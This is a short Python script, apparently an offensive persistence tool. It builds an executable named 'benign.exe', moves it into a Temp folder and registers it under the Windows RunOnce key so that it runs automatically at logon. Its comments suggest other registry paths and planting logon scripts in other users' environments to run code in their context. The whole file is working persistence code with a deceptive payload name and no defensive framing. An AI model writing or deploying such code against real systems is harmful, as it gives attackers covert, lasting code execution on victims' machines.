import os, shutil, winreg

file_dir = os.path.join(os.getcwd(), "Temp")
file_name = "benign.exe"
file_path = os.path.join(file_dir, file_name)

if os.path.isfile(file_path):
    os.remove(file_path)

os.system("python build_exe.py")

shutil.move(file_name, file_dir)

reghive = winreg.HKEY_CURRENT_USER

#switch out regpath depending on when the cript should run. use Environment for running on logon
#with right access can place logon script in other users environment variables for execution in context of other users
regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "CustomAutoRun", 0, winreg.REG_SZ, file_path)
